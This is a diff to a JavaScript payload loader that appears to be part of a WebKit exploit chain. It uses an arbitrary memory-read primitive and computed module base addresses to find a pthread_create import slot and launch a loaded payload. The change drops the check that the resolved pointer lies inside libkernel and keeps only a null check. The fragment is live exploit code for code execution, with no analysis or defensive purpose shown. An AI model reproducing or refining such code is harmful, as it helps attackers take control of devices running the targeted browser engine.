@@ -1606,19 +1606,17 @@ async function loadPayload(url, vorab) {
   const SLOT_1352 = 0x3cb9c00;
   const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
     ? c.off.wk___imp_pthread_create : SLOT_1352;
-  if (!c.webkitBase || !c.libkernelBase) {
-    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
+  if (!c.webkitBase) {
+    say("[p] no webkit base -- payload sits loaded at " + text(entry) + ", not started");
     return false;
   }
   const fnr = c.p.read8(c.webkitBase.add32(slot));
   const fn = v(fnr.low, fnr.hi);
-  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
-    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
-        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
+  if (isZero(fn)) {
+    say("[p] pthread_create slot is null -- not calling it");
     return false;
   }
-  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));
+  say("[p] pthread_create at " + text(fn));
 
   const thr = alloc(8);
   thr.u8.fill(0);
